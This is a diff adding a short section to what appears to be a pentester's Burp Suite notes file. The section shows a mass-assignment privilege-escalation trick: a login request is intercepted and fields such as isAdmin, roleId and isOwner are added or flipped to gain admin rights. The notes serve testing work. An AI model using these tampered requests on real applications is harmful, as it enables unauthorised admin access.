@@ -60,3 +60,16 @@ Burp Ram problem :
 You can set the max amount of ram that burp can use so it will work better and won't crash (Set Ram value in Task Manager)
 
 -------------------------------------------------------------------------------------------------------------------------------------
+Privilege Escalation: From normal user to admin
+
+▶Intercept the request while login:
+{"name":"test","email":"test@abc.com","password":"testing"}
+
+▶Modify the request above request like:
+{"name":"test","email":"test@abc.com","password":"testing","isAdmin":true}
+
+Some other parameter
+"isAdmin": false -> "isAdmin":true
+"roleId":1             ->  "roleId":0
+"isOwner":false ->  "isOwner":true
+-------------------------------------------------------------------------------------------------------------------------------------------
